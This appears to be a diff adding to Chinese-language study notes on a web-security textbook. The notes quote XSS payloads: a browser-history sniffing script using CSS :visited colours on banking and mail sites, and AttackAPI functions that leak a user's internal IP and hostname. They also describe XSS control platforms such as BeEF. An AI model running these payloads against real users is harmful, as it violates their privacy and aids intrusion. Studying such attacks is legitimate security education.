+                Redistribution and use in source and binary forms, with or without
+                modification, are permitted provided that the following conditions are met:
+
+                - Redistributions of source code must retain the above copyright notice,
+                this list of conditions and the following disclaimer.
+                - Redistributions in binary form must reproduce the above copyright notice,
+                this list of conditions and the following disclaimer in the documentation
+                and/or other materials provided with the distribution.
+                - Neither the name of the WhiteHat Security nor the names of its contributors
+                may be used to endorse or promote products derived from this software
+                without specific prior written permission.
+
+                THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+                AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+                IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+                ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
+                LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+                CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+                SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+                INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+                CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+                ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
+                THE POSSIBILITY OF SUCH DAMAGE.
+                */
+
+
+                /* A short list of websites to loop through checking to see if the victim has been there. Without noticable performance overhead, testing couple of a couple thousand URL's is possible within a few seconds. */
+                  var websites = [
+                    "http://ha.ckers.org/blog/",
+                    "http://login.yahoo.com/",
+                    "http://mail.google.com/",
+                    "http://mail.yahoo.com/",
+                    "http://my.yahoo.com/",
+                    "http://sla.ckers.org/forum/",
+                    "http://slashdot.org/",
+                    "http://www.amazon.com/",
+                    "http://www.aol.com/",
+                    "http://www.apple.com/",
+                    "http://www.bankofamerica.com/",
+                    "http://www.bankone.com/",
+                    "http://www.blackhat.com/",
+                    "http://www.blogger.com/",
+                    "http://www.bofa.com/",
+                    "http://www.capitalone.com/",
+                    "http://www.cgisecurity.com/",
+                    "http://www.chase.com/",
+                    "http://www.citibank.com/",
+                    "http://www.cnn.com/",
+                    "http://www.comerica.com/",
+                    "http://www.e-gold.com/",
+                    "http://www.ebay.com/",
+                    "http://www.etrade.com/",
+                    "http://www.flickr.com/",
+                    "http://www.google.com/",
+                    "http://www.hsbc.com/",
+                    "http://www.icq.com/",
+                    "http://www.live.com/",
+                    "http://www.microsoft.com/",
+                    "http://www.microsoft.com/en/us/default.aspx",
+                    "http://www.msn.com/",
+                    "http://www.myspace.com/",
+                    "http://www.passport.net/",
+                    "http://www.paypal.com/",
+                    "http://www.rsaconference.com/2007/US/",
+                    "http://www.salesforce.com/",
+                    "http://www.sourceforge.net/",
+                    "http://www.statefarm.com/",
+                    "http://www.usbank.com/",
+                    "http://www.wachovia.com/",
+                    "http://www.wamu.com/",
+                    "http://www.wellsfargo.com/",
+                    "http://www.whitehatsec.com/home/index.html",
+                    "http://www.wikipedia.org/",
+                    "http://www.xanga.com/",
+                    "http://www.yahoo.com/",
+                    "http://www2.blogger.com/home",
+                    "https://banking.wellsfargo.com/",
+                    "https://commerce.blackhat.com/",
+
+
+                  ];
+
+                  /* Loop through each URL */
+                  for (var i = 0; i < websites.length; i++) {
+
+                    /* create the new anchor tag with the appropriate URL information */
+                    var link = document.createElement("a");
+                    link.id = "id" + i;
+                    link.href = websites[i];
+                    link.innerHTML = websites[i];
+
+                    /* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
+                    document.write('<style>');
+                    document.write('#id' + i + ":visited {color: #FF0000;}");
+                    document.write('</style>');
+
+                    /* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
+                    document.body.appendChild(link);
+                    var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
+                    document.body.removeChild(link);
+
+                    /* check to see if the link has been visited if the computed color is red */
+                    if (color == "rgb(255, 0, 0)") { // visited
+
+                      /* add the link to the visited list */
+                      var item = document.createElement('li');
+                      item.appendChild(link);
+                      document.getElementById('visited').appendChild(item);
+
+                    } else { // not visited
+
+                      /* add the link to the not visited list */
+                      var item = document.createElement('li');
+                      item.appendChild(link);
+                      document.getElementById('notvisited').appendChild(item);
+
+                    } // end visited color check if
+
+                  } // end URL loop
+                  // -->
+                </script> 
+                ```
+            + 获取用户的真实IP
+                * 用户使用了代理，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。
+                * JavaScript本身并没有提供获取本地IP地址的能力
+                    - 借助第三方软件
+                        + Metasploit引擎曾展示过一个 [强大的测试页面](http://decloak.net/decloak.html) ，综合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件的功能，抓取用户的本地信息
+                        + 除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。
+                        + 客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。
+                            * 需要攻击者写一个Java Class，嵌入到当前页面中
+                            * XSS攻击框架“Attack API”中
+                                - 获取本地IP
+                                    ```
+                                    /**
+                                     ** @cat DOM
+                                     ** @name AttackAPI.dom.getInternalIP
+                                     ** @desc get internal IP address
+                                     ** @return {String} IP address
+                                    **/
+                                    AttackAPI.dom.getInternalIP = function () {
+                                      try {
+                                        var sock = new java.net.Socket();
+
+                                        sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+                                        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
+
+                                        return sock.getLocalAddress().getHostAddress(); 
+                                      } catch (e) {}
+
+                                      return '127.0.0.1';
+                                    }; 
+                                    ```
+                                * 获取本地网络信息
+                                    ```
+                                    /**
+                                     ** @cat DOM
+                                     ** @name AttackAPI.dom.getInternalHostname
+                                     ** @desc get internal hostname
+                                     ** @return {String} hostname
+                                    **/
+                                    AttackAPI.dom.getInternalHostname = function () {
+                                      try {
+                                        var sock = new java.net.Socket();
+
+                                        sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+                                        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
+                                        return sock.getLocalAddress().getHostName();    
+                                      } catch (e) {}
+
+                                      return 'localhost';
+                                    };
+
+                                    /**
+                                     ** @cat DOM
+                                     ** @name AttackAPI.dom.getInternalNetworkInfo
+                                     ** @desc get the internal network information
+                                     ** @return {Object} network information object
+                                    **/
+                                    AttackAPI.dom.getInternalNetworkInfo = function () {
+                                      var info = {hostname: 'localhost', IP: '127.0.0.1'};
+
+                                      try {
+                                        var sock = new java.net.Socket();
+
+                                        sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
+                                        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
+
+                                        info.IP = sock.getLocalAddress().getHostAddress();      
+                                        info.hostname = sock.getLocalAddress().getHostName();   
+                                      } catch (e) {}
+
+                                      return info;
+                                    };
+                                    ```
+    * XSS 攻击平台
+        - Attack API
+            + 总结了很多能够直接使用XSS Payload，归纳为API的方式
+        - BeEF
+            + 不同于Attack API，演示的是一个完整的XSS攻击过程
+            + 有一个控制后台, 控制前端的一切
+                * 每个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，并可以通过XSS向这些用户发送命令
+        - XSS-Proxy
+            + 轻量级的XSS攻击平台
+            + 通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器
+    * [ ] XSS Worm
+    * 调试JavaScript
+        - Firebug
+            + view HTML & CSS
+            + view DOM nodes
+            + debug js
+        - IE 8 Developer Tools
+        - Fiddler
+            + local proxy
+            + script supported
+        - HttpWatch
+            + a commercial sniffer plugin
+            + HTTPS supported
+    * [ ] XSS构造技巧
+        - [ ] 利用字符编码
+        - [ ] 绕过长度限制
+        - [ ] `<base>` 标签
+        - [ ] `window.name`
+    * [ ] 变鸡肋为宝
+    * [ ] Flash XSS
+    * [ ] JavaScript 开发框架 vuls
++ [ ] XSS的防御
+    * [ ] HttpOnly
+    * [ ] 输入检查
+    * [ ] 输出检查
+    * [ ] 正确防御
+    * [ ] 富文本
+    * [ ] DOM Based XSS
+    * [ ] 换个角度看XSS的风险
+            
+# 4 跨站请求伪造 CSRF
+
+# 5 点击劫持 ClickJacking
+
+# 6 HTML 5 安全
+
+# 第三篇 服务器端应用安全
+# 7 注入攻击
+
+# 8 文件上传漏洞
+
+# 9 认证与会话管理
+
+# 10 访问控制
+
+# 11 加密算法与随机数
+
+# 12 Web 框架安全
+
+# 13 应用层拒绝服务攻击
+
+# 14 PHP 安全
+
+# 15 Web Server 配置安全
+
+# 第四篇 互联网公司安全运营
+# 16 互联网业务安全
+
+# 17 安全开发流程 SDL
+
+# 18 安全运营
+
+# （附）谈谈互联网企业安全的发展方向
